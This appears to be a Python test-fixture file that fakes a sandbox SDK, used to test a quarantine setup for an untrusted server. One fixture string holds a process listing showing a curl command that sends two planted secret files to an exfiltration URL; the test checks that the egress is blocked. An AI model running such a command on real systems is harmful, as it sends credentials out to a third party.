"""In-memory stand-ins for the SDK sandbox and client, with neutral names and no real wire fields."""
import json
from types import SimpleNamespace

import quarantine

# A process listing in which the untrusted server's beacon is visible, reading both planted secrets.
BEACON_PS = (
    "    1 /sbin/init\n"
    f"  742 sh -c : {quarantine.BEACON_MARKER}; curl --data-binary @{quarantine.SECRET_FILES[0]} "
    f"--data-binary @{quarantine.SECRET_FILES[1]} {quarantine.EXFIL_URL}\n"
    "  900 python3 harness.py\n"
)
CLEAN_PS = "    1 /sbin/init\n  900 python3 harness.py\n"

HARNESS_OK = json.dumps({"ok": True, "tools": ["summarize_text"],
                         "answer": {"summary": "13 words. Gist: NeevCloud sandboxes run untrusted code..."}})

OBSERVED_OK = {
    "read": [{"path": quarantine.SECRET_FILES[0], "bytes": 227},
             {"path": quarantine.SECRET_FILES[1], "bytes": 142}],
    "exfil": {"url": quarantine.EXFIL_URL, "blocked": True, "error": "URLError: <urlopen error timed out>"},
    "beacon_pid": 742, "beacon_marker": quarantine.BEACON_MARKER,
}


def audit_record(tool="exec", command="python3", target="harness.py", outcome="success"):
    """Builds one audit record; outcome exposes .value, as the real SDK enum does."""
    return SimpleNamespace(tool=tool, command=command, target=target, outcome=SimpleNamespace(value=outcome))


def _result(exit_code=0, stdout="", stderr=""):
    return SimpleNamespace(exit_code=exit_code, stdout=stdout, stderr=stderr)


class FakeSandbox:
    """Scripts the sandbox calls the recipe makes: exec by command shape, files, egress update, audit."""

    def __init__(self, *, pip_exit=0, harness_stdout=HARNESS_OK, probe=_result(28, "0 000"),
                 pypi_probe=_result(28, "0 000"), ps_stdout=BEACON_PS, observed=OBSERVED_OK,
                 audit_records=None, ready_error=None, raise_on=None):
        self.name = f"{quarantine.PREFIX}test"
        self.pip_exit = pip_exit
        self.harness_stdout = harness_stdout
        self.probe = probe
        self.pypi_probe = pypi_probe
        self.ps_stdout = ps_stdout
        self.observed = observed
        self.audit_records = audit_records if audit_records is not None else [audit_record()]
        self.ready_error = ready_error
        self.raise_on = raise_on or {}
        self.calls = []          # ordered ("exec"|"update"|"write", detail) for sequence assertions
        self.written = {}
        self.deleted = False
        self.files = SimpleNamespace(write=self._write, read=self._read)

    def wait_until_ready(self, timeout_ms=None):
        if self.ready_error:
            raise self.ready_error
        return self

    def exec(self, command, args=None, cwd=None, env=None, timeout_ms=None, stdin=None):
        joined = " ".join([command] if isinstance(command, str) else list(command))
        joined = " ".join([joined, *(args or [])])
        self.calls.append(("exec", joined))
        for needle, error in self.raise_on.items():
            if needle in joined:
                raise error
        if "-m pip install" in joined:
            return _result(self.pip_exit, "", "" if self.pip_exit == 0 else "pip: could not install")
        if "harness.py" in joined:
            return _result(0, self.harness_stdout)
        if quarantine.PROBE_PAYLOAD in joined:  # an egress probe; pick the result by which host it targets
            return self.probe if quarantine.EXFIL_HOST in joined else self.pypi_probe
        if "-eo" in joined:
            return _result(0, self.ps_stdout)
        return _result(0, "")

    def update(self, params):
        self.calls.append(("update", params))
        return self

    def audit(self, from_=None, limit=None, **kwargs):
        return SimpleNamespace(records=list(self.audit_records), next_cursor=None)

    def delete(self):
        self.deleted = True

    def _write(self, path, content, cwd=None):
        self.calls.append(("write", path))
        self.written[path] = content
        return {"bytes_written": len(content)}

    def _read(self, path, cwd=None):
        if path == quarantine.OBSERVED and self.observed is not None:
            return json.dumps(self.observed).encode()  # the SDK returns bytes
        raise FileNotFoundError(path)


class FakeClient:
    """Mimics NeevAI().sandboxes.create and records the create params and allow_egress."""

    def __init__(self, sandbox):
        self.created = []

        def create(params, allow_egress=None):
            self.created.append((params, allow_egress))
            return sandbox

        self.sandboxes = SimpleNamespace(create=create)
